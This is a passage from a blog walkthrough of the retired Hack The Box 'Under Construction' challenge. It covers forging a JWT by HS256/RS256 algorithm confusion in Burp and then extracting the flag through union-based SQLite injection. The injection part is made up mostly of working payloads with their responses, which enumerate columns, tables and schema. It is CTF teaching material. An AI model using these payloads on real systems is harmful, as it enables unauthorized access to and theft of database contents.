</span></span></code></pre></div><p>As for the rest of the <strong>substeps</strong>,</p><ul><li><strong>Substep 5</strong> &ndash; <em>Go back to the JWT Editor Keys tab and click New Symmetric Key.</em></li><li><strong>Substep 6</strong> &ndash; <em>In the dialog, click Generate to generate a new key in JWK format.</em></li><li><strong>Substep 7</strong> &ndash; <em>Replace the generated value for the k parameter with a Base64-encoded PEM key that you just copied.</em></li><li><strong>Substep 8</strong> &ndash; Save the key.</li></ul><p>we can do them quite easily.</p><p><img loading=lazy src=/walkthroughs/htb/beginner-track/under-construction/burp_symmetric-key.png alt=burp_symmetric-key title=burp_symmetric-key></p><p>Before moving on to the next step, let&rsquo;s do a quick <strong>check</strong> and make sure that we can correctly <strong>sign</strong> a <strong>token</strong>.</p><p><img loading=lazy src=/walkthroughs/htb/beginner-track/under-construction/burp_signing-test.png alt=burp_signing-test title=burp_signing-test></p><p>Sending the request, we get a <strong>valid</strong> response back, which implies that our <strong>signature</strong> was <strong>accepted</strong>.</p><p><img loading=lazy src=/walkthroughs/htb/beginner-track/under-construction/burp_signing-test-response.png alt=burp_signing-test-response title=burp_signing-test-response></p><h3 id=step-34----create-a-malicious-jwt-with-a-modified-payload-and-sign-the-token><strong>Step 3/4</strong> &ndash; <strong>Create a malicious JWT with a modified payload and sign the token.</strong><a hidden class=anchor aria-hidden=true href=#step-34----create-a-malicious-jwt-with-a-modified-payload-and-sign-the-token>#</a></h3><p>This step combines the <strong>steps</strong> 3 and 4:</p><ul><li><strong>Step 3</strong> &ndash; <em>Create a malicious JWT with a modified payload and the alg header set to HS256.</em></li><li><strong>Step 4</strong> &ndash; <em>Sign the token with HS256, using the public key as the secret.</em></li></ul><p>We will perform the last two steps <strong>continously</strong>, one after the other as we play around and modify our <strong>sql injection</strong> <strong>payload</strong>.</p><p>Our next course of action is to exploit the <strong>sql injection vulnerability</strong> we found in - <em><strong>helpers/DBHelper.js</strong></em> - and use it as our <strong>payload</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=nx>db</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=sb>`SELECT * FROM users WHERE username = &#39;</span><span class=si>${</span><span class=nx>username</span><span class=si>}</span><span class=sb>&#39;`</span><span class=p>,</span> <span class=p>(</span><span class=nx>err</span><span class=p>,</span> <span class=nx>data</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=k>return</span> <span class=nx>rej</span><span class=p>(</span><span class=nx>err</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nx>res</span><span class=p>(</span><span class=nx>data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>});</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><h2 id=sql-injection><strong>SQL INJECTION</strong><a hidden class=anchor aria-hidden=true href=#sql-injection>#</a></h2><p>Since we already know that the <strong>dababase</strong> we are interacting with is an <em><strong>SQLite</strong></em> database (sqlite3 requirement in - <em><strong>helpers/DBHelper.js</strong></em> - ), we can simply look for an SQLite Injection <strong>cheat sheet</strong>. This <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md title=cheet-sheet>cheet-sheet)</a> from <em>PayloadsAllTheThings</em> is one of the more common ones.</p><p>Our main goal here is to simply <strong>retrieve</strong> or <strong>leak</strong> some <strong>data</strong> - the <strong>flag</strong> in our case - from the <strong>database</strong>.</p><p>Moreover, we already know that we are <strong>querying</strong> the - <em>users</em> - table as a default, so our first order of business is to <strong>determine</strong> the number of <strong>rows</strong> and <strong>columns</strong> that we are presented with. Our <strong>default</strong> <em><strong>sql</strong></em> <strong>query</strong> looks like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>`</span><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>username</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;${username}&#39;</span><span class=o>`</span><span class=w>
</span></span></span></code></pre></div><p>We can use the <em><strong>UNION</strong></em> operator to combine the results of two or more <em><strong>SELECT</strong></em> statements into a single result. This technique is called <em>union</em>-based <strong>SQL Injection</strong>. It is important to note, that every <em><strong>SELECT</strong></em> statement within <em><strong>UNION</strong></em> must have the <strong>same</strong> number of <strong>columns</strong>.</p><p>Since <strong>integer values</strong> are automatically converted to other types if need be, we use them to <strong>determine</strong> the <strong>returned</strong> number of columns.</p><p>We start out with <strong>1</strong> and <strong>increase</strong> our number until we find the correct number of columns.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// payload
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;username&#34;</span><span class=o>:</span> <span class=s2>&#34;username&#39; union select 1&#39;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl># http response
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>pre</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        Error: SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>pre</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>...
</span></span></code></pre></div><p><strong>Adding</strong> an other <strong>column</strong> does not help either. But we get <strong>valid</strong> <strong>results</strong> when using <strong>three</strong> <strong>values</strong> and we get the second column of the <strong>second</strong> <strong>row</strong> <strong>displayed</strong> in the <strong>response</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// payload
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;username&#34;</span><span class=o>:</span> <span class=s2>&#34;username&#39; union select 1,2,3&#39;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl># http response
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;card-body&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    Welcome 2<span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    This site is under development. <span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    Please come back later.
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>...
</span></span></code></pre></div><p>So let&rsquo;s play around with it a bit. First we display the <strong>sqlite version</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// payload
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;username&#34;</span><span class=o>:</span> <span class=s2>&#34;username&#39; union select 1, sqlite_version(),3&#39;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl># http response
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;card-body&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    Welcome 3.30.1<span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    This site is under development. <span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    Please come back later.
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>...
</span></span></code></pre></div><p>and then to <strong>limit</strong> the number of <strong>rows</strong> returned by our <em><strong>SELECT</strong></em> statement, we use the <em><strong>LIMIT</strong></em> and <em><strong>OFFSET</strong></em> clauses to display the <strong>second row</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// payload
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;username&#34;</span><span class=o>:</span> <span class=s2>&#34;username&#39; union select 1, 2, 3 limit 1 offset 1 --&#39;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl># http response
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;card-body&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    Welcome username<span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    This site is under development. <span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    Please come back later.
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>...
</span></span></code></pre></div><p>We can <strong>list</strong> the <strong>tables</strong> by using the following technique:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>SELECT tbl_name FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Use limit X+1 offset X, to extract all tables.
</span></span></code></pre></div><p>Listing tables: <strong>LIMIT=1</strong>, <strong>OFFSET=0</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// payload
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;username&#34;</span><span class=o>:</span> <span class=s2>&#34;username&#39; union select 1, tbl_name, 3 from sqlite_master where type=&#39;table&#39; and tbl_name not like &#39;sqlite_%&#39; limit 1 offset 0 --&#39;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl># http response
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;card-body&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    Welcome flag_storage<span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    This site is under development. <span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    Please come back later.
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>...
</span></span></code></pre></div><p>Listing tables: <strong>LIMIT=2</strong>, <strong>OFFSET=1</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// payload
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;username&#34;</span><span class=o>:</span> <span class=s2>&#34;username&#39; union select 1, tbl_name, 3 from sqlite_master where type=&#39;table&#39; and tbl_name not like &#39;sqlite_%&#39; limit 2 offset 1 --&#39;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl># http response
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;card-body&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    Welcome users<span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    This site is under development. <span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    Please come back later.
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>...
</span></span></code></pre></div><p>Listing tables: <strong>LIMIT=3</strong>, <strong>OFFSET=2</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// payload
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;username&#34;</span><span class=o>:</span> <span class=s2>&#34;username&#39; union select 1, tbl_name, 3 from sqlite_master where type=&#39;table&#39; and tbl_name not like &#39;sqlite_%&#39; limit 3 offset 2 --&#39;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl># http response
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;card-body&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    Welcome username<span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    This site is under development. <span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    Please come back later.
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>...
</span></span></code></pre></div><p>Listing tables: <strong>LIMIT=4</strong>, <strong>OFFSET=3</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// payload
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;username&#34;</span><span class=o>:</span> <span class=s2>&#34;username&#39; union select 1, tbl_name, 3 from sqlite_master where type=&#39;table&#39; and tbl_name not like &#39;sqlite_%&#39; limit 4 offset 3 --&#39;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl># http response
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>user username&#39; union select 1, tbl_name, 3 from sqlite_master where type=&#39;table&#39; and tbl_name not like &#39;sqlite_%&#39; limit 4 offset 3 --&#39; doesn&#39;t exist in our database.
</span></span></code></pre></div><p>With that, we have the following &lsquo;interesting&rsquo; <strong>tables</strong> on our hands:</p><ul><li><em><strong>flag_storage</strong></em></li><li><em><strong>users</strong></em></li><li><em><strong>username</strong></em></li></ul><p>Our <strong>primary</strong> interest here lies with the <em><strong>flag_storage</strong></em> table, so we list it&rsquo;s <strong>column&rsquo;s</strong>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// payload
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;username&#34;</span><span class=o>:</span> <span class=s2>&#34;username&#39; union select 1, sql, 3 from sqlite_master where type!=&#39;meta&#39; and sql not null and name=&#39;flag_storage&#39; --&#39;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl># http response
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;card-body&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    Welcome CREATE TABLE <span class=ni>&amp;quot;</span>flag_storage<span class=ni>&amp;quot;</span> (
</span></span><span class=line><span class=cl>	<span class=ni>&amp;quot;</span>id<span class=ni>&amp;quot;</span>	INTEGER PRIMARY KEY AUTOINCREMENT,
</span></span><span class=line><span class=cl>	<span class=ni>&amp;quot;</span>top_secret_flaag<span class=ni>&amp;quot;</span>	TEXT
</span></span><span class=line><span class=cl>    )<span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    This site is under development. <span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    Please come back later.
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>So we have <strong>two</strong> columns:</p><ul><li><em><strong>id</strong></em></li><li><em><strong>top_secret_flaag</strong></em></li></ul><h2 id=grabbing-the-flag><strong>GRABBING THE FLAG</strong><a hidden class=anchor aria-hidden=true href=#grabbing-the-flag>#</a></h2><p>All that&rsquo;s left now is to <strong>grab</strong> the <strong>flag</strong>, so we <strong>query</strong> the - <em><strong>flag_storage</strong></em> - table&rsquo;s - <em><strong>top_secret_flaag</strong></em> - column.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// payload
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;username&#34;</span><span class=o>:</span> <span class=s2>&#34;username&#39; union select 1, top_secret_flaag, 3 from flag_storage --&#39;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl># http response
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;card-body&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    Welcome HTB{<span class=p>&lt;</span><span class=nt>flag</span><span class=p>&gt;</span>}<span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    This site is under development. <span class=p>&lt;</span><span class=nt>br</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    Please come back later.
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>Finally, we <strong>submit</strong> the <strong>flag</strong> and <strong>review</strong> the challenge before <strong>terminating</strong> the challenge box.</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://bluewalle.github.io/tags/htb/>htb</a></li><li><a href=https://bluewalle.github.io/tags/walkthrough/>walkthrough</a></li><li><a href=https://bluewalle.github.io/tags/under-construction/>under-construction</a></li><li><a href=https://bluewalle.github.io/tags/challenge-box/>challenge-box</a></li><li><a href=https://bluewalle.github.io/tags/medium-box/>medium-box</a></li><li><a href=https://bluewalle.github.io/tags/completed-challenge/>completed-challenge</a></li><li><a href=https://bluewalle.github.io/tags/retired/>retired</a></li><li><a href=https://bluewalle.github.io/tags/static-code-analysis/>static-code-analysis</a></li><li><a href=https://bluewalle.github.io/tags/source-code-analysis/>source-code-analysis</a></li><li><a href=https://bluewalle.github.io/tags/sql-injection/>sql-injection</a></li><li><a href=https://bluewalle.github.io/tags/cve-2022-23541/>cve-2022-23541</a></li><li><a href=https://bluewalle.github.io/tags/jwt/>jwt</a></li><li><a href=https://bluewalle.github.io/tags/jwt-vulnerabilities/>jwt-vulnerabilities</a></li></ul></footer></article></main><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>